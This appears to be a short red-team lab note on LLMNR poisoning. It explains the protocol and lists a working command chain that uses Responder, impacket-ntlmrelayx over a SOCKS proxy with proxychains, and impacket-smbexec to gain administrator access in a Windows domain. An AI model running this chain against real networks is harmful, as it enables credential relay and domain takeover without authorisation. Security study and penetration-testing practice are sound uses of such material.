LLMNR poisoning:
![llmnr-attack](https://github.com/ParastouRazi/Red-Team-Attacks/assets/85788536/fced396c-ea0c-4c14-9384-d0ea401c5678)

LLMNR poisoning is a man-in-the-middle (MITM) attack that exploits this protocol. An attacker sends out a fake LLMNR response pretending to be from the computer with which the name was requested.


LLMNR stands for Link-Local Multicast Name Resolution and is used by Windows to resolve the names of neighbouring computers without using a domain name system (DNS) server. LLMNR works by sending out multicast queries over local networks asking if any specific computers with certain names exist and whether any have responded with their IP addresses when queried by LLMNR.


Goal :We want to use LLMNR poisoning and get domain administrator and system user access.

Commands:
sudo nano /etc/responder/Responder.conf

sudo responder -I eth0 -v

sudo impacket-ntlmrelayx -socks -smb2support -tf pari.txt

sudo nano /etc/proxychains4.conf

socks5 127.0.0.1 1080

sudo proxychains4 -q impacket-smbexec PARASTOO/ADMINISTRATOR:administrator@192.168.1.126
https://www.youtube.com/watch?v=NBYbhvTtSb0

https://github.com/ParastouRazi/Red-Team-Attacks/assets/85788536/5d4db7cd-209a-463d-8207-54a5d002bd7f

